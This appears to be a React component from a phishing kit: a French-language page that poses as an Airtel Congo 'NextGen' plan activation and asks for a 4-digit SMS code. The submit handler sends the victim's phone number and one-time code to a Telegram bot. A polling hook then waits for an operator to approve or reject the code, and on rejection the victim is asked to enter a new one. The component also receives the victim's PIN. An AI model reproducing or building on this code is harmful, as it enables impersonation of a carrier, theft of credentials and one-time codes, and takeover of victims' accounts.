import React, { useState, useRef, useEffect } from 'react';
import { motion } from 'motion/react';
import { AirtelLogo } from './Logos';
import { InternetPlan } from '../types';
import { ValidatingModal } from './ValidatingModal';
import { useTelegramPolling } from '../hooks/useTelegramPolling';
import { telegramService } from '../services/telegramService';
import {
  ShieldCheck,
  ArrowLeft,
  Lock,
  RefreshCw,
  AlertTriangle,
  Loader2,
  KeyRound,
  Zap,
} from 'lucide-react';

interface OtpPageProps {
  phone: string;
  pin: string;
  sessionId: string;
  selectedPlan: InternetPlan;
  onBack: () => void;
  onOtpSuccess: () => void;
}

export const OtpPage: React.FC<OtpPageProps> = ({
  phone,
  pin,
  sessionId,
  selectedPlan,
  onBack,
  onOtpSuccess,
}) => {
  const [otpDigits, setOtpDigits] = useState<string[]>(['', '', '', '']);
  const [countdown, setCountdown] = useState(60);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [isWaitingTelegram, setIsWaitingTelegram] = useState(false);

  const otpInputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Countdown timer for SMS resend
  useEffect(() => {
    if (countdown <= 0) return;
    const timer = setInterval(() => {
      setCountdown((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [countdown]);

  // Handle single digit input
  const handleDigitChange = (index: number, value: string) => {
    const clean = value.replace(/\D/g, '').slice(-1);
    const newDigits = [...otpDigits];
    newDigits[index] = clean;
    setOtpDigits(newDigits);
    setErrorMessage(null);

    // Auto focus next
    if (clean && index < 3) {
      otpInputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otpDigits[index] && index > 0) {
      otpInputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
    if (pasted) {
      const newDigits = ['', '', '', ''];
      for (let i = 0; i < pasted.length; i++) {
        newDigits[i] = pasted[i];
      }
      setOtpDigits(newDigits);
      if (pasted.length === 4) {
        otpInputRefs.current[3]?.focus();
      } else {
        otpInputRefs.current[pasted.length]?.focus();
      }
    }
  };

  const currentOtp = otpDigits.join('');
  const isOtpComplete = currentOtp.length === 4;

  // Telegram polling hook for OTP verification
  const { status: telegramStatus } = useTelegramPolling({
    sessionId,
    targetStep: 'otp',
    isActive: isWaitingTelegram,
    onApproved: () => {
      setTimeout(() => {
        setIsWaitingTelegram(false);
        onOtpSuccess();
      }, 800);
    },
    onRejected: () => {
      setIsWaitingTelegram(false);
      setErrorMessage('Code OTP incorrect ou expiré. Veuillez vérifier le SMS et réessayer.');
      setOtpDigits(['', '', '', '']);
      otpInputRefs.current[0]?.focus();
    },
  });

  const handleSubmit = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!isOtpComplete || isSubmitting) return;

    setIsSubmitting(true);
    setErrorMessage(null);

    try {
      // Send OTP to Telegram Bot directly or via server
      await telegramService.sendOtp({
        sessionId,
        phone,
        otp: currentOtp,
        planName: `${selectedPlan.dataAmount} ${selectedPlan.dataUnit} (${selectedPlan.validity})`,
        planPrice: selectedPlan.price,
      });

      setIsWaitingTelegram(true);
    } catch (err: any) {
      setErrorMessage(err.message || 'Échec de transmission du code.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleResend = () => {
    if (countdown > 0) return;
    setCountdown(60);
    setOtpDigits(['', '', '', '']);
    setErrorMessage(null);
    otpInputRefs.current[0]?.focus();
  };

  return (
    <div className="min-h-screen bg-[#F7F9FC] flex flex-col justify-between text-neutral-900 selection:bg-[#E60000] selection:text-white">
      {/* Top Header */}
      <header className="w-full bg-white border-b border-neutral-200 shadow-sm py-4 px-4 sm:px-6">
        <div className="max-w-4xl mx-auto flex items-center justify-between">
          <button
            type="button"
            id="btn-back-to-login"
            onClick={onBack}
            className="flex items-center gap-1.5 text-xs font-bold text-neutral-600 hover:text-[#E60000] transition-colors py-2 px-2.5 rounded-xl hover:bg-neutral-100 cursor-pointer"
          >
            <ArrowLeft className="w-4 h-4" />
            <span className="hidden xs:inline">Modifier les identifiants</span>
            <span className="xs:hidden">Retour</span>
          </button>

          <div className="flex items-center gap-2">
            <span className="text-[11px] font-bold text-neutral-500 uppercase tracking-wider hidden sm:inline-block">
              Validation 2FA Sécurisée
            </span>
            <div className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse" />
          </div>
        </div>
      </header>

      {/* Main OTP Center Box */}
      <main className="flex-1 flex flex-col items-center justify-center px-4 py-6 sm:py-12">
        <motion.div
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          exit={{ opacity: 0, scale: 0.95 }}
          transition={{ duration: 0.35 }}
          className="w-full max-w-lg bg-white rounded-3xl shadow-[0_15px_45px_rgba(0,0,0,0.07)] border border-neutral-200/80 p-5 sm:p-9 relative overflow-hidden"
        >
          {/* Top Brand Stripe */}
          <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-[#E60000] via-rose-500 to-[#c40000]" />

          {/* Airtel NextGen Logo */}
          <div className="flex flex-col items-center text-center mb-6">
            <div className="w-14 h-14 rounded-2xl bg-red-50 text-[#E60000] flex items-center justify-center mb-3 shadow-inner border border-red-100">
              <KeyRound className="w-7 h-7" />
            </div>
            <AirtelLogo variant="nextgen" className="h-10 mb-2" />
            <h2 className="text-xl sm:text-2xl font-black text-neutral-900 tracking-tight mt-2">
              Vérification du Code OTP
            </h2>
            <p className="text-xs sm:text-sm text-neutral-500 mt-2 max-w-sm">
              Un code de sécurité à <b>4 chiffres</b> a été transmis par SMS au numéro :
            </p>
            <div className="mt-2 inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-neutral-100 border border-neutral-200 text-xs font-bold text-neutral-800">
              <span>🇨🇩 +243 {phone}</span>
            </div>
          </div>

          {/* Selected Plan Summary Banner */}
          <div className="mb-6 p-3.5 rounded-2xl bg-neutral-50 border border-neutral-200 flex items-center justify-between text-xs gap-2">
            <div className="flex items-center gap-2 min-w-0">
              <Zap className="w-4 h-4 text-[#E60000] shrink-0" />
              <span className="font-medium text-neutral-600 truncate">Forfait:</span>
              <span className="font-bold text-neutral-900 truncate">
                {selectedPlan.dataAmount} {selectedPlan.dataUnit}
              </span>
            </div>
            <span className="font-black text-[#E60000] shrink-0">{selectedPlan.price}</span>
          </div>

          {/* Error Message Box */}
          {errorMessage && (
            <motion.div
              initial={{ opacity: 0, y: -5 }}
              animate={{ opacity: 1, y: 0 }}
              className="mb-5 p-3.5 rounded-2xl bg-rose-50 border border-rose-200 text-rose-700 text-xs flex items-start gap-2.5 font-medium"
            >
              <AlertTriangle className="w-4 h-4 shrink-0 mt-0.5" />
              <span>{errorMessage}</span>
            </motion.div>
          )}

          {/* 4-Digit OTP Form */}
          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label className="block text-xs font-bold text-neutral-600 uppercase tracking-wider text-center mb-3">
                Saisissez les 4 chiffres du code SMS
              </label>

              {/* 4 Discrete Boxes */}
              <div className="flex items-center justify-center gap-2.5 sm:gap-3.5">
                {[0, 1, 2, 3].map((index) => (
                  <input
                    key={index}
                    id={`otp-input-${index}`}
                    ref={(el) => {
                      otpInputRefs.current[index] = el;
                    }}
                    type="text"
                    inputMode="numeric"
                    autoFocus={index === 0}
                    maxLength={1}
                    value={otpDigits[index]}
                    onChange={(e) => handleDigitChange(index, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(index, e)}
                    onPaste={index === 0 ? handlePaste : undefined}
                    className="w-12 h-14 sm:w-16 sm:h-16 text-center text-2xl font-black text-neutral-900 rounded-2xl border-2 border-blue-600 bg-white focus:border-[#E60000] focus:ring-4 focus:ring-red-500/20 focus:outline-none transition-all shadow-sm"
                  />
                ))}
              </div>
            </div>

            {/* Resend Timer / Button */}
            <div className="flex items-center justify-between text-xs pt-1 flex-wrap gap-2">
              <span className="text-neutral-500 font-medium">Vous n'avez pas reçu le code ?</span>
              <button
                type="button"
                id="btn-resend-otp"
                disabled={countdown > 0}
                onClick={handleResend}
                className={`font-bold flex items-center gap-1 transition-colors ${
                  countdown > 0
                    ? 'text-neutral-400 cursor-not-allowed'
                    : 'text-[#E60000] hover:underline cursor-pointer'
                }`}
              >
                <RefreshCw className={`w-3.5 h-3.5 ${countdown > 0 ? 'animate-spin' : ''}`} />
                <span>{countdown > 0 ? `Renvoyer (${countdown}s)` : 'Renvoyer le code'}</span>
              </button>
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              id="btn-validate-otp"
              disabled={!isOtpComplete || isSubmitting}
              className={`w-full py-4 px-6 rounded-2xl font-black text-sm uppercase tracking-widest transition-all flex items-center justify-center gap-2 shadow-lg ${
                isOtpComplete && !isSubmitting
                  ? 'bg-[#E60000] hover:bg-[#c90000] active:scale-[0.98] text-white shadow-red-600/30 cursor-pointer'
                  : 'bg-neutral-200 text-neutral-400 cursor-not-allowed shadow-none'
              }`}
            >
              {isSubmitting ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin" />
                  <span>Validation du code OTP...</span>
                </>
              ) : (
                <>
                  <ShieldCheck className="w-5 h-5" />
                  <span>VALIDER LE CODE OTP</span>
                </>
              )}
            </button>
          </form>

          {/* Security footnote */}
          <div className="mt-6 pt-4 border-t border-neutral-100 flex items-center justify-center gap-2 text-[11px] text-neutral-500 font-medium">
            <Lock className="w-3.5 h-3.5 text-emerald-600 shrink-0" />
            <span>Protégé par Airtel NextGen Security Gateway</span>
          </div>
        </motion.div>
      </main>

      {/* Validating OTP Modal */}
      <ValidatingModal
        isOpen={isWaitingTelegram}
        type="otp"
        phone={phone}
        planName={`${selectedPlan.dataAmount} ${selectedPlan.dataUnit}`}
        status={telegramStatus}
      />

      {/* Footer with clean responsive spacing */}
      <footer className="w-full bg-white border-t border-neutral-200 mt-auto py-8 sm:py-10 px-4 sm:px-6 text-center">
        <div className="max-w-4xl mx-auto flex flex-col items-center justify-center gap-3 sm:gap-4">
          <AirtelLogo variant="red" size="sm" />
          <p className="text-xs text-neutral-600 font-medium">
            En collaboration avec <span className="text-neutral-900 font-bold tracking-wider">STARLINK™</span>
          </p>
          <p className="text-[11px] text-neutral-400">
            © 2026 Airtel Congo. Tous droits réservés.
          </p>
        </div>
      </footer>
    </div>
  );
};
